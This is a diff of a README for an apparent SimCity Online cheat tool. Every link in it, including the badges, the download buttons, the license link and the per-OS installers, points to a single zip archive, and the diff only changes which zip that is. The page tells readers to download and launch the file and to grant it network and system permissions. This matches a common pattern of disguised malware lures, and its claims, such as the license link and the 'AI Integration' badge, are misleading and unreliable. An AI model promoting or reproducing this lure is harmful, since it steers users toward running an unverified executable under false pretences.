@@ -1,10 +1,10 @@
 # SimCity Online Cheats Repository 🚦
 
-[![Release](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip%https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
-[![OS Support](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip%20%7C%20Mac%20%7C%20Linux-blue)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
-[![License: MIT](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
-[![AI Integration](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip%20Powered-OpenAI%20&%20Claude-blueviolet)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
-[![Build Status](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
+[![Release](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip%https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
+[![OS Support](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip%20%7C%20Mac%20%7C%20Linux-blue)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
+[![License: MIT](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
+[![AI Integration](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip%20Powered-OpenAI%20&%20Claude-blueviolet)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
+[![Build Status](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
 
 ---
 
@@ -16,13 +16,13 @@ Dive into the ultimate vault for **SimCity Online cheats**—crafted for urban d
 
 Before you run off to your virtual metropolis, secure your custom SimCity experience below!
 
-[![Download](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
+[![Download](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
 
 1. **Begin Download**  
    Smash the blue button above and you’ll be whisked away to our one-of-a-kind SimCity Online enhancement package!
 
 2. **Install the Optimizer**  
-   After your urban toolkit has landed on your device, unzip to a preferred directory. Launch the `https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip` (Windows), `https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip` (Mac), or the standalone `https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip` (Linux).
+   After your urban toolkit has landed on your device, unzip to a preferred directory. Launch the `https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip` (Windows), `https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip` (Mac), or the standalone `https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip` (Linux).
 
 3. **Activation Sequence**  
    Follow on-screen prompts to synchronize with your SimCity Online instance. Grant appropriate permissions for network and system overlay features.
@@ -107,7 +107,7 @@ Around-the-clock city supervision: have an issue or a question at 3 AM? Our supp
 ## 📜 License
 
 This repository is distributed under the terms of the MIT license (2025).  
-For full license text, please see [here](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip).
+For full license text, please see [here](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip).
 
 ---
 
@@ -115,7 +115,7 @@ For full license text, please see [here](https://raw.githubusercontent.com/Chauh
 
 Ready to catapult your gameplay into new orbit? Don’t let your epic city fade—revisit the download portal below.
 
-[![Download](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-simcity-boosters-2.0-beta.1.zip)
+[![Download](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chauham12/simcity-online-boosters/branch/unexculpably/online-boosters-simcity-v2.8.zip)
 
 ---
 
